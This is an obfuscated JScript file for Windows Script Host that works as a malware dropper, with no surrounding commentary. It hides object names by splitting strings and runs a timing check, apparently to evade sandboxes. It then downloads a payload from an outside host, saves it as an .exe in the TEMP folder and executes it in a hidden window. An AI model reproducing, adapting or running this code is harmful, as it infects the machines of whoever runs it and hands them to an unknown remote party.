var GG = false;
var AF = "Create"+"Object";
var AL = function HN() {return WScript[AF]("WScript"+".Shell");}(), SE = 11;
var JL = "MSXML2"+".XMLHTTP";
var ZP = 2;
var A0 = ZP - 2;
function LC(N0){AL["Run"](N0, A0, A0);};
function DX(){return JL + "";};
function I(SX, L){A0 = A0 * 1; return SX - L;};
function E(){return AF;};
/*@cc_on
  @if (@_win32 || @_win64)
    GG = true;
  @end
@*/
if (GG)
{
var A = "";
function U0(){return 22;};
var A1 = 0; var OG = 0;
function UX()
{
var F = new this["Date"]();
var S0 = F["getUTCMilliseconds"]();
WScript["Sleep"](U0());
var F = new this["Date"]();
var BA = F["getUTCMilliseconds"]();
WScript["Sleep"](U0());
var F = new this["Date"]();
var AS = F["getUTCMilliseconds"]();
var A1 = "XB";
A1 = I(BA, S0);
var OG = "B";
OG = I(AS, BA);
A = "open";
return I(A1, OG);
}
var PY = false;
var ZO = false;
for (var YO = A0; YO < U0() * 1; YO++){if (UX() != A0){
PY = true; 
OG = "31" + 11 * A1 + OG; 
ZO = true; 
break;
}}
function M() {return ((PY == true) && (PY == ZO)) ? 1 : A0;};
if (PY && M() && ZO){
function J() {return AL["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "jdgQTFVwdqi3FC.ex" + "e";};
 XH = DX();
 T = WScript[AF](XH);
 var J0 = 1;
do { 
	for (;J0;){
	try {
		if (J0 == 1)
		{
			T[A]("GET", "http://arcfestoheni.hu/n3usad", false);
			T["send"]();
			QY = "Sleep";
			J0 = 2;
		}
		WScript[QY](U0() + 120); 
		if (T["readystate"] < 2 * 2) continue;
		J0 = A0;
		function U(N) {var OR = (1, 2, 3, 4, 5, N); return OR;};
		OT = WScript[E()]("ADODB.Stream");
		XH = OT;
		XH[A]();
		XH["type"] = U(1);
		XH["write"](T["ResponseBody"]);
		OT["position"] = U(A0);
		XH["Save" + "ToFile"](J(), 2);
		OT["cl"+"ose"]();
		S = J();
		LC(S);
	} catch(Y){};};
}while (J0);
}
}

